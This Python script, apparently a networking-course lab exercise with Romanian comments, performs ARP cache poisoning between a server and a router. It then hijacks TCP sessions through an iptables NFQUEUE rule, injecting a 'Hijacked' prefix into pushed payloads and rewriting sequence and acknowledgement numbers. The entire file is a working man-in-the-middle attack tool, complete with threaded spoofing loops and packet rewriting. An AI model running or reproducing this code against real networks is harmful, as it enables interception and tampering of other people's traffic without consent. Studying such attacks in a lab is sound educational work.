#https://www.geeksforgeeks.org/how-to-make-a-arp-spoofing-attack-using-scapy-python/
#https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
#https://en.wikipedia.org/wiki/Transmission_Control_Protocol

#import tot scapy-ul
import sys
import os
import logging
#scapy ul are un warning, il ignor
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import time
import scapy.all as scapy
import threading
from netfilterqueue import NetfilterQueue as NFQ

time_out = 2


def get_macadrees(_ip):
    '''
    Returneaza mac adress ul pentru un ip 
    :param _ip: string de numere delimitate cu punct
    :return: string mac adress delimitate prin doua puncte 
    '''
    #fac requestul de ARP dupa adresa ip din parametrii
    #pdst = ip ul destinatie
    request = scapy.ARP(pdst=_ip) 

    #fac brodcastul pentru toate
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    #combin layere
    final_packet = broadcast / request
    
    # answer = result-urile dupa ce fac broadcast
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]

    #hwsrc = mac adressu -ul sursei care a trimit reply packet-ul, adica al targetului
    try: 
        mac_adress = answer[0][1].hwsrc
    except:
        print("Nu a fost gasit ip-ul: " + _ip)
        sys.exit(1)
        return 
    return mac_adress



def spoof_router():
    while True:
        # cream un pachet ARP 

        packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=server_ip)
       
        # Trimit la router pachetul care il face sa creada ca middle este serverul 
        scapy.send(packet, verbose=False)

        print(f"[INFO] Sent spoofed ARP packet: {server_ip} is-at {router_mac} to {router_ip}")
        
        time.sleep(time_out) 
        

def spoof_server():
    while True:
         # cream un pachet ARP 
        packet = scapy.ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=router_ip)
        # Trimit la server pachetul care il face sa creada ca middle este router-ul 
        scapy.send(packet, verbose=False)

        print(f"[INFO] Sent spoofed ARP packet: {router_ip} is-at {server_mac} to {server_ip}")
        
        time.sleep(time_out) 
       



def restore_server():
    print("Restoring router's MAC address for the server")
    for i in range(5):
        packet = scapy.ARP(op=2, pdst=server_ip, hwsrc=router_mac, psrc=router_ip)
        scapy.send(packet, verbose = False)

def restore_router():
    print("Restoring server's MAC address for the router")
    for i in range(5):
        packet = scapy.ARP(op=2, pdst=router_ip, hwsrc=server_mac, psrc=server_ip)
        scapy.send(packet, verbose = False)


#Parametrii de ARP spoofing
    # ip-urile sunt de pe subnet2  
server_ip = "198.7.0.2"
router_ip = "198.7.0.1" 

#Extrag MAC adress-urile pentru server si router
server_mac = get_macadrees(server_ip)
router_mac = get_macadrees(router_ip)

def startSpoofing():
    

    #testez daca a functionat preluarea de adrese MAC
    if server_mac is None:
        print("[ERROR] Eroare la preluarea MAC-ului pentru ip-ul: " + server_ip)
        sys.exit(1)
    if router_mac is None:
        print("[ERROR] Eroare la preluarea MAC-ului pentru ip-ul: " + router_ip)
        sys.exit(1)

    print(server_ip + " " + server_mac)
    print(router_ip + " " + router_mac)

    #pornesc aplicatia pe thread-uri
    try:
        print("[INFO] Starting the attack")
        thread_router = threading.Thread(target = spoof_router)
        thread_server = threading.Thread(target = spoof_server)

        thread_router.start()
        thread_server.start()

        thread_router.join()
        thread_server.join()


    except KeyboardInterrupt:
        print("[INFO] Restoring ARP tables ...")
        restore_router()
        restore_server()
        sys.exit(1)

dict_seq = dict()
dict_ack = dict()

def process_packet(_packet):
    global dict_seq 
    global dict_ack
    
    #iau sectiunea data din packet si o salvez in payload
    payload = _packet.get_payload()

    packet = scapy.IP(payload)
    print(f"[INFO] Processing packet: {_packet}")

    #verific daca packetul este TCP si daca vine de la server sau router
    if(packet.haslayer(scapy.TCP) and (packet[scapy.IP].src == server_ip or packet[scapy.IP].src == router_ip)):
        #salvez datele din packet 
        tcp_flags    = packet[scapy.TCP].flags
        original_seq = packet[scapy.TCP].seq 
        original_ack = packet[scapy.TCP].ack
        # verificam daca original_seq e deja in dictionar
        if original_seq in dict_seq:
            new_seq = dict_seq[original_seq]
        else:
            new_seq = original_seq
        # aceeasi verificare si pentru ack
        if original_ack in dict_ack:
            new_ack = dict_ack[original_ack]
        else:
            new_ack = original_ack
        payload_data = packet[scapy.TCP].payload
        
        
        #verificam flagul PSH care se afla de la bitul 4 
        if tcp_flags & 0x08 != 0: 
            payload_prefix = 'Hijacked '.encode('ascii')
            payload_data = scapy.packet.Raw(payload_prefix + bytes(packet[scapy.TCP].payload))
        
        #calculez din now seq si ack pentru packet 
        dict_seq[original_seq + len(packet[scapy.TCP].payload)] = new_seq + len(payload_data)
        dict_ack[new_seq + len(payload_data)] = original_seq + len(packet[scapy.TCP].payload)

        
        # cream layerul IP nou
        ip_layer = scapy.IP()
        ip_layer.src = packet[scapy.IP].src
        ip_layer.dst = packet[scapy.IP].dst

        # cream layer ul tcp
        tcp_layer = scapy.TCP()
        tcp_layer.sport = packet[scapy.TCP].sport
        tcp_layer.dport = packet[scapy.TCP].dport
        tcp_layer.seq = new_seq
        tcp_layer.ack = new_ack
        tcp_layer.flags = packet[scapy.TCP].flags

        # combinam layerele si adaugam noul payload
        packetToBeSent = ip_layer / tcp_layer / payload_data
        print("The packet was successfully modified!")
        scapy.send(packetToBeSent)
    else:

        scapy.send(packet)
    

def startHijacking():
    
    queue = NFQ()
    try:

        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
        queue.bind(10, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        queue.unbind()



if __name__ == '__main__':

    thread_spoofing = threading.Thread(target = startSpoofing)
    thread_tcp_hijacking = threading.Thread(target = startHijacking)

    thread_spoofing.start()
    thread_tcp_hijacking.start()

    thread_spoofing.join()
    thread_tcp_hijacking.join()

